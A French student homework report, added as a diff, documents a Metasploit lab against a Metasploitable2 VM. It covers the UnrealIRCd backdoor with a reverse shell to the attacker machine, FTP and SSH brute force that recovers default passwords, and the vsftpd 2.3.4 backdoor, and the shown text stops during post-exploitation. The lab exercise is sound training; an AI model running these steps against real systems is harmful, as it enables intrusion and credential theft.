@@ -1,0 +1,1076 @@
+ 
+  
+
+Formation audit technique
+Devoir maison
+Date d’envoi du sujet au CNAM  : 06 juin 2025
+
+
+  
+ 
+
+Préparé par P. SWEID 
+
+
+Nom élève : Le Louédec
+
+Prénom élève : Yannick
+
+
+Consignes :
+* Le CR doit porter le nom : USCB17-M2 Orange-CR Projet-Nom-Prénom
+* Le CR doit être au format word (au format pdf si impossible de le fournir au format word)
+* Pour chaque question, il faut rappeler la (les) commandes utilisée (s), avec une capture d’écran aussi
+* Ne pas oublier de commenter brièvement les captures d’écran 
+* Attention à la rédaction du document de CR (sommaire, liste des figures, …etc.) [des points bonus sur cette partie]
+
+Bon courage
+
+
+Table des matières
+1.	Objectifs	5
+2.	Prérequis	5
+3.	Installation et vérification des machines virtuelles	5
+4.	Partie A	7
+Question 01 :	7
+Question 02 :	8
+Question 03 :	9
+Question 04 :	10
+Question 05 :	11
+Question 06 :	12
+5.	Partie B	17
+A.	Phase initiale :	17
+Question 01 :	17
+Phase de scan :	17
+Question 02 :	17
+Question 03 :	19
+Question 04 :	22
+Question 05 :	22
+Question 06 :	29
+B.	Phase d’exploitation	35
+C.	Phase de poste exploitation	40
+Question 07 :	40
+Question 08 :	43
+
+
+
+Liste des figures
+
+Figure 1. ping sur la machine victime Metasploitable2	6
+Figure 2. Exécution de la commande « $ which msfconsole »	6
+Figure 3. Exécution de la commande « show options »	7
+Figure 4. Exécution de la commande « search UnrealIRCd »	7
+Figure 5. Exécution des commandes « use exploit/unix/irc/unreal_ircd_3281_backdoor » et « show options »	8
+Figure 6. Exécution de la commande « exploit »	9
+Figure 7. Exécution de la commande « set RHOSTS 172.23.0.129 »	9
+Figure 8. Exécution de la commande « show payloads »	10
+Figure 9. Exécution de la commande « set payload cmd/unix/reverse »	11
+Figure 10. Exécution de la commande « set LHOST 172.23.0.29 »	11
+Figure 11. Exécution de la commande « exploit »	12
+Figure 12. Exécution de la commande « ls »	13
+Figure 13. Exécution de la commande « uname »	13
+Figure 14. Exécution de la commande « whoami »	13
+Figure 15. Exécution de la commande « ip a »	14
+Figure 16. Exécution de la commande « ls -l »	15
+Figure 17. Exécution de la commande « download spamfilter.conf /home/kali/Desktop/file.txt »	15
+Figure 18. Exécution de la commande « ls -l /home/kali/Desktop »	16
+Figure 19. Exécution de la commande « db_status »	17
+Figure 20. Exécution de la commande « workspace  -a  ubuntusploitable »	18
+Figure 21. Exécution de la commande « workspace »	18
+Figure 22. Exécution de la commande « workspace -h »	18
+Figure 23. Exécution de la commande « db_nmap -p 1-65535 -sV 172.23.0.129 »	19
+Figure 24. Exécution de la commande « hosts »	20
+Figure 25. Exécution de la commande « services »	20
+Figure 26. Exécution de la commande « search auxiliary/scanner/ftp/ »	22
+Figure 27. Exécution de la commande « use auxiliary/scanner/ftp/ftp_login »	22
+Figure 28. Exécution de la commande « show options »	23
+Figure 29. Exécution de la commande « hosts -R »	23
+Figure 30. Exécution de la commande « show options »	24
+Figure 31. Exécution de la commande	24
+Figure 32. Exécution de la commande « show options »	25
+Figure 33. Exécution de la commande « run » (extraits)	27
+Figure 34. Exécution de la commande « creds »	27
+Figure 35. Exécution de la commande « search auxiliary/scanner/ssh/ »	29
+Figure 36. Exécution de la commande « use auxiliary/scanner/ssh/ssh_login »	29
+Figure 37. Exécution de la commande « show options »	30
+Figure 38. Exécution de la commande « set DB_ALL_CREDS true »	30
+Figure 39. Exécution de la commande « set RHOSTS 172.23.0.129 »	31
+Figure 40. Exécution de la commande « run »	31
+Figure 41. Exécution de la commande « sessions »	32
+Figure 42. Exécution de la commande « sessions -d »	32
+Figure 43. Exécution de la commande « vulns »	33
+Figure 44. Exécution de la commande « search vsftpd 2.3.4 »	35
+Figure 45. Exécution de la commande « search ProFTPD 1.3.1 »	35
+Figure 46. Exécution de la commande « use exploit/unix/ftp/vsftpd_234_backdoor »	35
+Figure 47. Exécution de la commande « set RHOSTS 172.23.0.129 »	36
+Figure 48. Exécution de la commande « show payloads »	36
+Figure 49. Exécution des commandes « set payload payload/cmd/unix/interact », puis « show options »	37
+Figure 50. Exécution de la commande « run »	37
+Figure 51. Exécution de la commande « vulns »	38
+Figure 52. Exécution de la commande « creds »	38
+Figure 53. Exécution de la commande « show post »	40
+Figure 54. Exécution de la commande « use post/linux/gather/enum_configs »	40
+Figure 55. Exécution de la commande « set SESSION 1 »	41
+Figure 56. Exécution de la commande « run »	42
+Figure 57. Exécution de la commande « loot »	42
+Figure 58. Exécution des commandes « use post/linux/gather/hashdump »	43
+Figure 59. Exécution des commandes « set SESSION 4 » et « show options »	43
+Figure 60. Exécution de la commande « run »	44
+Figure 61. Exécution de la commande « sessions »	44
+Figure 62. Exécution des commandes « sessions -i 1 », puis « whoami »	44
+Figure 63. Exécution de la commande « sudo su »	45
+Figure 64. Exécution de la commande « whoami »	45
+Figure 65. Exécution de la commande « creds »	46
+Figure 66. Exécution de la commande « sudo ls -l /root/.msf4/loot/ »	47
+
+
+
+
+1. Objectifs
+
+Partie A : 
+Se familiariser avec les commandes Metasploit en utilisant l’exploit “unreaIRCD“
+
+Partie B : 
+Simuler les 3 phases d’attaque :
+1. Scan
+2. Exploit
+3. Post-exploit
+En utilisant l’exploit vs_ftpd_backdoor
+
+2. Prérequis
+*  Une machine virtuelle Kali
+* Une machine virtuelle Metasploitable dédiée à ce type de simulation (VM Metasploitable2)
+* Mise en réseau des deux machines (<=> Les deux machines doivent communiquer ensemble)
+* La console MSF « Framework Metasploit » sur la machine Kali
+
+
+3. Installation et vérification des machines virtuelles 
+
+Normalement, l’environnement mis à disposition par le CNAM de Bretagne vous permet d’avoir les deux machines Kali et Metasploitable 2 opérationnelles 
+
+Question 01 :
+Démarrer les deux machines Kali et Metasploitable
+Dans Kali, ouvrir un terminal 
+? Vérifier que vous pouvez envoyer des requêtes « ping » à Metasploitable (donner une capture d’écran montrant les résultats du ping)
+
+
+L’adresse IP de la machine Kali est « 172.23.0.29 », et celle de la machine victime Metasploitable2 est « 172.23.0.129 ». 
+
+La machine victime Metasploitable2 répond aux requêtes « ping » envoyée depuis la machine Kali. La connectivité depuis la machine Kali vers la machine victime Metasploitable2 est ainsi vérifiée.
+
+
+
+Figure 1. ping sur la machine victime Metasploitable2
+ 
+
+Question 02 :
+Exécuter la commande : $ which msfconsole 
+? Donner le résultat de l’exécution de cette commande : 
+
+Le résultat de la commande est : « /usr/bin/msfconsole »
+
+
+Figure 2. Exécution de la commande « $ which msfconsole »
+
+? Signification ?
+
+La commande « which » sert à afficher le chemin complet vers l'exécutable msfconsole : 
+son emplacement exact est « /usr/bin/msfconsole ». 
+
+L'exécutable msfconsole sert à lancer et utiliser le framework Metasploit en mode console.
+
+
+Question 03 :
+Toujours dans le terminal, démarrer la base $ service postgresql start
+Lancer la commande : $sudo msfconsole
+Une fois vous êtes sous le contrôle de la console MSF, exécuter la commande : msf6 > show options
+
+J’exécute la commande « show options ».
+
+
+
+Figure 3. Exécution de la commande « show options »
+
+
+
+? Quel est l’utilité de cette commande ? 
+
+Cette commande sert à afficher les options de configuration : les options globales de Metasploit, et les options du module utilisé le cas échéant.
+
+La commande affiche les valeurs prises par les options déjà configurées.
+
+
+4. Partie A
+
+Question 01 :
+Effectuer une recherche d’exploit : unrealIRCD
+
+J’exécute la commande « search UnrealIRCd ».
+
+? Fournir une capture d’écran des résultats de vos recherches 
+
+
+Figure 4. Exécution de la commande « search UnrealIRCd »
+
+
+
+
+
+? Conclusion ?
+
+La commande « search UnrealIRCd » sert à afficher la liste des modules liés à UnrealIRCd, y compris les exploits, les scanners et les modules auxiliaires s’il y en a.
+
+Ici la commande search me fournit un exploit : « exploit/unix/irc/unreal_ircd_3281_backdoor ». 
+Sa description est « UnrealIRCD 3.2.8.1 Backdoor Command Exécution » ; il est ainsi exploitable pour une vulnérabilité de backdoor dans UnrealIRCd version 3.2.8.1. La date de divulgation de cette vulnérabilité est le 12 juin 2010. Il est classé « excellent ». Il n’a pas de fonctionnalité de vérification pour déterminer si la cible est vulnérable (« Check No »). 
+
+
+
+Question 02 :
+Afficher les informations correspondantes  
+
+J’exécute les commandes « use exploit/unix/irc/unreal_ircd_3281_backdoor » (ou, de façon équivalente « use 0 ») et « show options », respectivement pour choisir d’utiliser l’exploit « UnrealIRCD 3.2.8.1 Backdoor Command Exécution » et pour afficher ses options de configuration.
+
+
+Figure 5. Exécution des commandes « use exploit/unix/irc/unreal_ircd_3281_backdoor » et « show options »
+
+
+? Quelles sont les options requises ?
+
+La figure 5 montre que les options qui doivent être obligatoirement configurées sont RHOSTS et RPORT : c’est-à-dire l’adresse et le numéro de port à cibler sur la machine victime. 
+Il est à noter que RPORT a une valeur par défaut : le port 6667.
+
+
+Question 03 :
+1. Quelle est la commande pour utiliser ce module (exploit) : 
+
+C’est la commande « exploit ».
+
+2. Exécuter cette commande,
+
+Figure 6. Exécution de la commande « exploit »
+
+
+3. Quelles sont les options supplémentaires à renseigner 
+
+msfconsole renvoie une erreur indiquant qu’il faut configurer l’option RHOSTS.
+      
+4. Saisir ces informations pour cibler la machine Metasploitable2
+
+J’exécute la commande « set RHOSTS 172.23.0.129 », pour configurer l’adresse IP de la machine victime, en l’occurrence la machine Metasploitable2.
+J’exécute ensuite la commande « show options » pour vérifier la mise à jour de la configuration.
+
+
+Figure 7. Exécution de la commande « set RHOSTS 172.23.0.129 »
+Question 04 :
+La réussite des exploits dépend des charges actives ou payloads, ajoutées régulièrement à Metasploit de la même façon que les modules.
+Ces charges déterminent sur quel(s) type(s) de matériel(s) et d’éléments on cible l’attaque.
+? Exécuter la commande pour lister les charges actives disponibles : 
+
+J’exécute la commande « show payloads » pour lister les charges actives disponibles. La commande affiche 12 charges différentes.
+
+
+Figure 8. Exécution de la commande « show payloads »
+
+
+Parmi la liste des charges actives compatibles listées précédemment, on peut voir une plage d’options utilisant des Shells.
+Les payloads sont divisés en deux catégories :
+* Connecté (bind)
+* Inversé (reverse)
+
+REMARQUE : L’outil Meterpreter est principalement disponible pour les cibles Microsoft Windows. Mais, il existe aussi des charges actives permettant d’obtenir une session Meterpreter sous Linux. 
+
+Shell connecté : Précise à la machine d’ouvrir un shell de commande et d’écouter sur le port local. L’attaquant se connecte sur la machine ciblée sur le port d’écoute. Ceci dit, à cause des pare-feu, l’efficacité des shells connectés a échoué car n’importe quel pare-feu correctement configuré bloque les ports aléatoires tels que 4444.
+
+Shell inversé : Pousse activement une connexion inversée à destination de l’attaquant plutôt que d’attendre une connexion entrante. Dans ce cas de figure, sur notre machine d’attaque on ouvre un port local en écoute d’une connexion de la cible, permettant ainsi de se faufiler plus facilement au travers des pare-feu.
+
+
+
+
+Question 05 :
+1. Choisir le shell inversé suivant payload cmd/unix/reverse ( commande : set payload cmd/unix/reverse )
+
+
+J’exécute la commande « set payload cmd/unix/reverse » pour sélectionner cette charge.
+
+
+Figure 9. Exécution de la commande « set payload cmd/unix/reverse »
+
+
+ATTENTION : comme dans l’exemple ci-dessus, il s’agit d’un shell inversé, on doit alors préciser la cible où envoyer le shell. Il faut donc mentionner :
+* L’adresse IP de la machine d’attaque
+* Le port sur lequel on écoute les connexions entrantes
+
+Positionner l’adresse IP de la machine d’attaque dans la variable : LHOST
+
+
+J’exécute la commande « set LHOST 172.23.0.29 », qui est l’adresse IP de la machine attaquante Kali, comme il s’agit de monter un shell inversé.
+
+
+Figure 10. Exécution de la commande « set LHOST 172.23.0.29 »
+
+
+Dès lors que le cadre de l’exploit est fixé, on peut alors demander à Metasploit de l’exécuter via l’instruction : msf6 > exploit
+
+2. Interpréter les résultats de l’exécution de la commande : exploit 
+
+
+J’exécute la commande « exploit ». 
+
+
+
+
+Figure 11. Exécution de la commande « exploit »
+
+Voici l'interprétation du résultat de la commande exploit :
+Le handler de connexion TCP inverse a été lancé sur le port 172.23.0.29:4444.
+La machine victime Metasploitable2 a accepté la connexion sur le port 172.23.0.129:6667. L'exploit a ainsi réussi à exécuter la commande backdoor sur le service UnrealIRCd de la machine victime.
+Une commande « echo vl8sF9bzhtiBkbL2 » a été exécutée, et la réponse reçue, pour vérifier que la session shell avec la machine Metasploitable2est ouverte.
+
+
+Cette dernière commande liste alors les différentes étapes par lesquelles on passe avant d’en arriver à l’exécution de l’exploit. Cela se termine par une session Meterpreter. Ce dernier est le moyen de prendre la main et de passer des commandes à distance, à la machine cible afin d’exécuter l’ensemble des étapes permettant de réaliser notre exploit.
+
+
+Question 06 :
+1. Donner les résultats de l’exécution des commandes suivantes : 
+ls, uname, whois, whoami, ip a
+
+
+
+Figure 12. Exécution de la commande « ls »
+
+La commande « ls » fonctionne et elle affiche la liste des fichiers présent dans le répertoire courant de la machine victime. 
+
+
+Le résultat de la commande « uname » est le suivant : 
+Linux
+
+
+
+Figure 13. Exécution de la commande « uname »
+
+
+Le résultat de la commande « whois » est le suivant : 
+sh: line 9: whois: command not found
+
+
+Le résultat de la commande « whoami » est le suivant : 
+root
+
+
+
+Figure 14. Exécution de la commande « whoami »
+
+Je dispose bien ainsi d’un shell avec les privilèges root sur la machine victime.
+
+
+Le résultat de la commande « ip a » est le suivant : 
+
+
+
+Figure 15. Exécution de la commande « ip a »
+
+
+2. L’adresse IP affichée correspond à quelle machine ? Pouvez-vous interpréter ceci ?
+
+L’adresse IP affichée par la commande « ip a » est l’adresse IP 172.23.0.129 de la machine Metasploitable2.
+En effet, les commandes ci-dessus sont exécutées sur le shell à distance que j’ai monté. Elles affichent donc les mêmes résultats que si elles étaient exécutées en étant directement sur la machine Metasploitable2.
+
+
+3. Exécuter les commandes suivantes :
+ls -l
+download spamfilter.conf /home/psw/Bureau/file.txt
+
+N.B : le dossier cible « dans cet exemple : /home/psw/Bureau/ » est à modifier en fonction de votre environnement.
+
+Quel est le résultat attendu ?
+
+J’exécute les commandes « ls -l » et « download spamfilter.conf /home/kali/Desktop/file.txt ».
+
+
+
+
+
+Figure 16. Exécution de la commande « ls -l »
+
+
+
+
+Figure 17. Exécution de la commande « download spamfilter.conf /home/kali/Desktop/file.txt »
+
+
+
+Interprétation : 
+
+La première commande permet d’afficher la liste des fichiers présent dans le répertoire courant de la machine victime, et notamment de relever la présence du fichier « spamfilter.conf ».
+
+La deuxième commande télécharge le fichier « spamfilter.conf » depuis le répertoire courant de la machine Metasploitable2 dans un fichier nommé « file.txt » sur le bureau de la machine attaquante kali (chemin complet : /home/kali/Desktop/file.txt).
+
+La commande « ls -l /home/kali/Desktop » permet de vérifier que le fichier file.txt est bien dans le répertoire « /home/kali/Desktop » :
+
+
+
+Figure 18. Exécution de la commande « ls -l /home/kali/Desktop »
+
+
+
+
+5. Partie B
+Dans cette partie, nous allons utiliser une base de données pour stocker les résultats de scan de vulnérabilités. Pour cela, on doit initialiser la base de données :
+
+A. Phase initiale :
+Lancer la console msf  ($ sudo msfconsole)
+Question 01 :
+? Vérifier si la base de données est connectée
+
+
+J’exécute la commande « db_status », ce qui permet de vérifier que la base de données est bien connectée.
+
+
+
+Figure 19. Exécution de la commande « db_status »
+
+
+Phase de scan : 
+Question 02 :
+1. Donner la commande pour créer l’espace de travail ubuntusploitabl
+
+La commande est « workspace  -a  ubuntusploitabl ».
+
+A noter. J’ai fait une première session de mini-projet avec le workspace « ubuntusploitabl ». Mais j’ai eu un problème avec Guacamole au cours de cette session. 
+J’ai ainsi refait une nouvelle session avec le workspace « ubuntusploitable ».
+
+
+Exécuter cette commande 
+
+J’exécute la commande « workspace  -a  ubuntusploitable ».
+
+
+
+Figure 20. Exécution de la commande « workspace  -a  ubuntusploitable »
+
+
+
+2. Vérifier qu’il s’agit du bon workspace par défaut
+
+J’exécute la commande « workspace », qui me permet de vérifier est le workspace « ubuntusploitable » est bien le workspace par défaut.
+
+
+
+Figure 21. Exécution de la commande « workspace »
+
+
+3. La commande msf6 > workspace -h permet de lister les commandes disponibles 
+
+
+
+Figure 22. Exécution de la commande « workspace -h »
+
+
+Question 03 :
+1. Donner la commande permettant de scanner les ports 1-65535 de la machine victime (ça prendra plusieurs minutes)
+
+
+La commande est : « db_nmap -p 1-65535 -sV 172.23.0.129 ».
+L’option facultative -sV permet d’afficher les versions des services.
+
+
+
+2. Exécuter cette commande ; donner les résultats de l’exécution de cette commande  
+On doit noter dans le résultat du scan, la présence des services vulnérables IRC et FTP et leurs versions.
+
+J’exécute la commande « db_nmap -p 1-65535 -sV 172.23.0.129 » et je retrouve bien la présence des services vulnérables IRC et FTP et leurs versions (UnrealIRCd, vsftpd 2.3.4, ProFTPD 1.3.1).
+
+
+
+Figure 23. Exécution de la commande « db_nmap -p 1-65535 -sV 172.23.0.129 »
+
+
+
+
+3. Exécuter les commandes :  msf6 > hosts , msf6 > services. Vos constatations ?
+
+J’exécute la commande « hosts » :
+
+
+
+Figure 24. Exécution de la commande « hosts »
+
+
+J’exécute la commande « services » :
+
+
+Figure 25. Exécution de la commande « services »
+
+L’exécution des commandes « hosts » et « services » permet de vérifier que les résultats du scan effectué avec la commande db_nmap ont bien été enregistrés dans la base de données PostgreSQL utilisée par MSF. Les commandes comme hosts et services permettent de récupérer ces informations dans la base de données PostgreSQL et de les afficher.
+
+
+
+
+Question 04 :
+Chercher les scanner par brute force correspondante au service ftp à l’aide de la commande : 
+ msf6 > search auxiliary/scanner/ftp/
+
+J’exécute la commande « search auxiliary/scanner/ftp/ » à cet effet.
+
+
+
+Figure 26. Exécution de la commande « search auxiliary/scanner/ftp/ »
+
+
+Vérifier que l’exploit : auxiliary/scanner/ftp/ftp_login se trouve dans la liste des exploits affichés.
+
+L’exploit « auxiliary/scanner/ftp/ftp_login » se trouve dans la ligne 4 des exploits affichés :
+
+« 4  auxiliary/scanner/ftp/ftp_login                    normal  No     FTP Authentication Scanner »
+
+Question 05 :
+1. Rappeler et exécuter la commande pour utiliser le scanner ftp_login  
+
+J’exécute la commande « use auxiliary/scanner/ftp/ftp_login » pour utiliser le scanner ftp_login, puis « show options » pour afficher ses options.
+
+
+
+
+Figure 27. Exécution de la commande « use auxiliary/scanner/ftp/ftp_login »
+
+
+
+
+
+2. Afficher les options requises au scanner ftp_login
+
+J’exécute la commande « show options ».
+
+
+
+Figure 28. Exécution de la commande « show options »
+
+
+3. Déclarer la machine metsaploitable2  comme cible (commande : msf6 auxiliary(scanner/ftp/ftp_login) > hosts -R)
+
+J’exécute la commande « hosts -R » qui exploite la liste des hosts enregistrés dans la base de données postgres sur la machine attaquante Kali pour mettre à jour la configuration du scanner ftp_login. 
+
+
+
+Figure 29. Exécution de la commande « hosts -R »
+
+
+
+
+4. Afficher les options manquantes, vérifier que la liste est vide <=> toutes les options requises sont configurées
+
+J’exécute ensuite la commande « show options » pour vérifier la mise à jour de la configuration.
+Toutes les options requises sont bien configurées.
+
+
+
+Figure 30. Exécution de la commande « show options »
+
+
+5. Ajouter un fichier de mots de passe pour réaliser le scan par brute force (commande : set USERPASS_FILE /usr/share/wordlists/metasploit/piata_ssh_userpass.txt
+
+J’exécute la commande « set USERPASS_FILE /usr/share/wordlists/metasploit/piata_ssh_userpass.txt ».
+
+
+
+Figure 31. Exécution de la commande
+« set USERPASS_FILE /usr/share/wordlists/metasploit/piata_ssh_userpass.txt »
+
+
+6. Avec la commande : show options, vérifier que cette variable est bien positionnée 
+
+J’exécute la commande « show options ». La variable « USERPASS_FILE » est bien positionnée.
+
+
+
+Figure 32. Exécution de la commande « show options »
+
+
+7. Exécuter le scan par brute force (commande : msf6 auxiliary(scanner/ftp/ftp_login) > run) / la commande. Afficher les résultats de l’exécution de la commande. Est-ce que vous constatez dans ces résultats des tentatives de connexions réussie ?
+
+J’exécute la commande « run ».
+Des extraits de cette exécution sont rapportés dans les copies d’écran de la figure ci-dessous.
+
+
+
+
+
+
+
+
+
+
+Figure 33. Exécution de la commande « run » (extraits)
+
+
+Je constate dans les résultats des tentatives de connexions que 4 tentatives ont réussies. 
+
+Voici la liste des tentative réussies :
+ 
+[+] 172.23.0.129:21       - 172.23.0.129:21 - Login Successful: ftp:123456
+[+] 172.23.0.129:21       - 172.23.0.129:21 - Login Successful: user:user
+[+] 172.23.0.129:21       - 172.23.0.129:21 - Login Successful: postgres:postgres
+[+] 172.23.0.129:21       - 172.23.0.129:21 - Login Successful: msfadmin:msfadmin
+
+
+
+8. Arrêter le scanner. Ensuite, sortir du mode scanner à l’aide de la commande back. Puis, exécuter la commande : msf6 > creds pour afficher les privilèges obtenus. Quel sont les privilèges obtenus par le scanner par brute force
+
+J’exécute les commandes « back », puis « creds ».
+
+
+
+Figure 34. Exécution de la commande « creds »
+La commande « creds » affiche 4 lignes de credentials, qui correspondent bien à la sortie du scan par brute force, c’est-à-dire avec ces 4 comptes : 
+
+- « ftp:123456 », « user:user » 
+Ces deux comptes sont possiblement des comptes basiques, avec des privilèges limités :
+o Un accès générique, limité à des répertoires publics, pour « ftp:123456 »
+o Un accès utilisateur, potentiellement avec des droits en lecture et écriture dans son répertoire personnel, pour « user:user »
+Nous avons pu confirmer qu’ils n’ont pas de privilèges « root » en se connectant sur les sessions correspondantes : passer en sudo n’est pas possible, ils ne sont pas sudoers.
+
+- « postgres:postgres »
+Il s’agit a priori d’un compte lié au serveur de base de données, qui tourne sur le port 5432 PostgreSQL de la machine victime Metasploitable2. Il pourrait avoir des privilèges élevés sur ce service en particulier.
+
+
+- « msfadmin: msfadmin »
+Ce compte a des privilèges root, comme le montrent d’ailleurs les tests faits dans la suite du projet (voir Partie C / Question Q08).
+
+
+
+
+
+
+
+Question 06 :
+1. Chercher les scanners correspondants au service ssh pour accès par brute force ( msf6 > search auxiliary/scanner/ssh/)
+
+J’exécute la commande « search auxiliary/scanner/ssh/ ». Elle affiche 13 scanners.
+
+
+
+Figure 35. Exécution de la commande « search auxiliary/scanner/ssh/ »
+
+
+2. Utiliser le scanner « auxiliary/scanner/ssh/ssh_login »
+
+J’exécute la commande « use auxiliary/scanner/ssh/ssh_login ».
+
+
+
+Figure 36. Exécution de la commande « use auxiliary/scanner/ssh/ssh_login » 
+
+
+3. A l’aide de la commande : show, donner la liste des options qu’on peut utiliser avec .
+
+J’exécute la commande « show options » qui affiche la liste des options configurables.
+
+
+
+Figure 37. Exécution de la commande « show options » 
+
+
+
+4.  Utiliser tous les privilèges obtenus (option DB_ALL_CREDS ) 
+
+J’exécute la commande « set DB_ALL_CREDS true ».
+
+
+
+Figure 38. Exécution de la commande « set DB_ALL_CREDS true »
+
+
+5. Déclarer la machine Metasploitable2 comme cible
+
+J’exécute la commande « set RHOSTS 172.23.0.129 », pour configurer l’adresse IP de la machine victime
+J’exécute ensuite la commande « show options » pour vérifier la mise à jour et la complétude de la configuration.
+
+
+
+Figure 39. Exécution de la commande « set RHOSTS 172.23.0.129 »
+
+
+6. Exécuter le scan, combien de sessions ouvertes sont ouvertes ? 3
+
+
+J’exécute la commande « run ».
+
+
+
+Figure 40. Exécution de la commande « run »
+
+
+Trois sessions sont ouvertes : 
+- une avec le nom d’utilisateur « msfadmin », 
+- une avec le nom d’utilisateur « postgres », 
+- une avec le nom d’utilisateur « user ».
+
+
+
+
+
+
+
+
+
+7. Sortir du mode scanner, ensuite exécuter la commande (msf6 > sessions), commenter les résultats obtenus.
+
+J’exécute la commande « sessions ».
+
+
+
+Figure 41. Exécution de la commande « sessions »
+
+
+Voici les résultats obtenus à l’exécution de la commande sessions » : il y a 3 sessions actives via Metasploit, de type shell linux, montées avec SSH sur l’adresse IP 172.23.0.129 et le port 22 de la machine victime etasploitable2, et respectivement sur les ports 33515, 39387 et 34831 de la machine attaquante Kali.
+
+
+8.  Donner la liste les sessions inactive (commande : session -d)
+
+J’exécute la commande « sessions -d ».
+
+L’exécution de la commande « sessions -d » indique qu’il n’y a pas de sessions inactives. 
+
+
+
+
+Figure 42. Exécution de la commande « sessions -d »
+
+
+
+
+9. Afficher les résultats des vulnérabilités détectées (commande : vulns)
+
+
+L’exécution de la commande « vulns » fournit deux vulnérabilités détectées sur la machine victime Metasploitable2 : 
+- la vulnérabilité « UnrealIRCD 3.2.8.1 Backdoor Command Execution » qui a pour référence « CVE-2010-2075,OSVDB-65445,URL-http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt »
+- la vulnérabilité « SSH Login Check Scanner » qui a pour référence « CVE-1999-0502 ».
+
+
+
+Figure 43. Exécution de la commande « vulns »
+
+10.  Consulter le site cve.org et renseignez-vous sur les vulnérabilités détectées en utilisant les références mentionnées dans les résultats de la question précédente.
+
+La vulnérabilité « UnrealIRCD 3.2.8.1 Backdoor Command Execution » est ainsi décrit sur le site cve.org : « UnrealIRCd 3.2.8.1, as distributed on certain mirror sites from November 2009 through June 2010, contains an externally introduced modification (Trojan Horse) in the DEBUG3_DOLOG_SYSTEM macro, which allows remote attackers to execute arbitrary commands. ». 
+
+Cette vulnérabilité est relative à une version compromise de UnrealIRCd 3.2.8.1 qui était disponible sur le site officiel de UnrealIRCd entre novembre 2009 et juin 2010 et qui contenait une porte dérobée. Celle-ci permettait à un attaquant d'exécuter des commandes arbitraires sur le serveur.
+
+
+
+La vulnérabilité CVE-1999-0502 est documentée sur le site cve.org : « A Unix account has a default, null, blank, or missing password ». 
+
+Elle a dû à une configuration insuffisante du mot de passe d’un compte unix sur la machine victime : dû soit l’absence de mot de passe, soit l’utilisation d’un mot de passe par défaut, nul, ou vide. 
+
+Il est ainsi possible d’exploiter cette vulnérabilité, de type « authentification faible ou par défaut », dans une attaque de type « brute force » consistant à utiliser une liste de noms d'utilisateur et de mots de passe (faibles ou par défaut) pour effectuer des tentatives de connexions SSH sur la machine victime, et le cas échéant avoir un accès non autorisé au système, potentiellement avec des privilèges élevés.
+
+Pour pallier cette vulnérabilité, il est recommandé d’utiliser des mots de passe forts, ou mieux, une authentification par clé publique, et d’activer une solution pour limiter les tentatives de connexion en échec.
+
+
+
+
+B. Phase d’exploitation 
+La phase d’exploitation des vulnérabilités du service FTP
+
+Le service ftp fait partie de la liste des services identifiés par le scan db_nmap 
+
+1. Chercher l’exploit correspondant à la vulnérabilité 
+
+La commande « db_nmap -p 1-65535 -sV 172.23.0.129 » (Partie 1 / Question Q03) indique que la machine victime Metasploitable2 a deux services FTP :
+- Le service « vsftpd 2.3.4 » est actif sur le port 21
+- Le service « ProFTPD 1.3.1 » est actif sur le port 2121
+
+
+La commande « search vsftpd 2.3.4 » fournit l’exploit suivant :
+« exploit/unix/ftp/vsftpd_234_backdoor ».
+
+
+Figure 44. Exécution de la commande « search vsftpd 2.3.4 »
+
+
+La commande « search ProFTPD 1.3.1 » ne fournit aucun exploit.
+
+
+Figure 45. Exécution de la commande « search ProFTPD 1.3.1 »
+
+
+2. Utiliser l’exploit identifié 
+
+Après la commande « search vsftpd 2.3.4 », j’exécute la commande « use exploit/unix/ftp/vsftpd_234_backdoor ».
+
+
+
+Figure 46. Exécution de la commande « use exploit/unix/ftp/vsftpd_234_backdoor » 
+
+3. Déclarer la machine Metasploitable2 comme cible
+
+J’exécute la commande « set RHOSTS 172.23.0.129 », pour configurer l’adresse IP de la machine victime
+
+
+
+
+Figure 47. Exécution de la commande « set RHOSTS 172.23.0.129 »
+
+
+4. Lister les charges actives disponibles
+
+La commande « show payloads » affiche une charge active disponible : 
+« payload/cmd/unix/interact ».
+
+
+
+Figure 48. Exécution de la commande « show payloads »
+
+
+
+
+5. Utiliser le payload disponible
+
+J’exécute la commande « set payload payload/cmd/unix/interact », puis « show options » pour vérifier que la configuration est correcte.
+
+
+
+Figure 49. Exécution des commandes « set payload payload/cmd/unix/interact », puis « show options »
+
+
+6. Exécuter l’exploit
+
+
+J’exécute la commande « run » (ou « exploit »).
+J’obtiens une session référencée « session 4 ». Il s’agit d’une session shell root, donc avec les privilèges root.
+
+
+
+Figure 50. Exécution de la commande « run »
+
+
+7. Donner la (ou les) vulnérabilité (s) détectée(s)
+
+La commande « vulns » affiche 3 vulnérabilités détectées.
+
+La nouvelle vulnérabilité détectée est :
+« VSFTPD v2.3.4 Backdoor Command Exécution » 
+
+et qui a pour référence : 
+« OSVDB-73573,URL-http://pastebin.com/AetT9sS5,URL-http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html »
+
+
+
+Figure 51. Exécution de la commande « vulns »
+
+
+8. A l’aide de la commande creds, donner la liste des privilèges obtenus
+
+La commande « creds » affiche les listes des privilèges obtenus.
+
+
+
+Figure 52. Exécution de la commande « creds »
+
+
+La commande affichait 4 lignes à l’issue de la question Q05 de la partie A, relatives au service « 21/tcp (ftp) » (donc sur le port 21).
+
+Elle affiche maintenant 3 lignes supplémentaires, relatives au service « 22/tcp (ssh) » (donc sur le port 22), et avec les comptes suivants : « user/user » et « postgres/postgres », « msfadmin/msfadmin  », surlignés en vert ci-dessous.
+
+
+
+
+
+
+
+
+
+msf6 > creds
+Credentials
+===========
+
+host          origin        service       public    private   realm  private_type  JtR Format  cracked_password
+----          ------        -------       ------    -------   -----  ------------  ----------  ----------------
+172.23.0.129  172.23.0.129  21/tcp (ftp)  ftp       123456           Password                  
+172.23.0.129  172.23.0.129  21/tcp (ftp)  user      user             Password                  
+172.23.0.129  172.23.0.129  22/tcp (ssh)  user      user             Password                  
+172.23.0.129  172.23.0.129  21/tcp (ftp)  postgres  postgres         Password                  
+172.23.0.129  172.23.0.129  22/tcp (ssh)  postgres  postgres         Password                  
+172.23.0.129  172.23.0.129  21/tcp (ftp)  msfadmin  msfadmin         Password                  
+172.23.0.129  172.23.0.129  22/tcp (ssh)  msfadmin  msfadmin         Password                  
+
+msf6 >
+
+
+C. Phase de poste exploitation 
+Question 07 : 
+1. A l’aide de la commande «  >show post», afficher les post disponibles 
+
+La commande affiche 421 posts. La figure ci-dessous en affiche un extrait.
+
+
+
+Figure 53. Exécution de la commande « show post »
+
+
+2. Utiliser le post enum_configs,
+
